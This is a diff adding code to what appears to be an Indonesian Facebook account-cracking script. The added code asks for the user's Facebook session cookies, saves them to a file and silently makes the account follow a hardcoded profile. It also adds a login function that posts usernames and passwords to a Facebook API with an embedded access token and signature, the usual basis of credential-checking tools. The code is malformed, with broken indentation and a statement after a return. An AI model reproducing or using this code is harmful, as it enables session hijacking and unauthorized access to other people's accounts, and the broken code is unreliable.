@@ -199,6 +199,50 @@ def menu():
 		exit("\033[1;97m token Removed")
 	else:
 		menu()
+                    cek = open("cookies").read()
+             except FileNotFoundError:
+                   ikeh_ikeh_kimochi()
+                   kontol()
+                   cek = input("\n\033[0;92m       [ \033[0;97mThis Tool Use Facebook Cookies \033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
+                   print('\n\033[97m [\033[92m+\033[97m] \033[92mPleas Wait...')
+             cek = {"cookie":cek}
+             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
+             if "mbasic_logout_button" in str(ismi):
+                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
+                             with open("cookies","w") as f:
+                                     f.write(cek["cookie"])
+                     else:
+                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
+                           try:
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                           except:
+                                  pass
+                     try:
+                             ikuti = parser(requests.get(mbasic.format("/GARANGAN.KECHE"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
+                             ses.get(mbasic.format(ikuti),cookies=cek)
+                     except :
+                             pass
+                     return cek["cookie"]
+                     aahh('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
+             else:
+                  os.system("xdg-open https://youtu.be/DF7bUCn0GFY") 
+                  os.system('rm -rf cookies')
+                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
+                  os.system('python2 RAKA.py')
+         def login(username,password,cek=False):
+             global die,check,result,count
+             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
+             params = {
+                     'access_token': b,
+                     'format': 'JSON',
+                     'sdk_version': '2',
+                     'email': username,
+                     'locale': 'en_US',
+                     'password': password,
+                     'sdk': 'ios',
+                     'generate_session_cookies': '1',
+                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+             }
 
 def publik():
 	global token
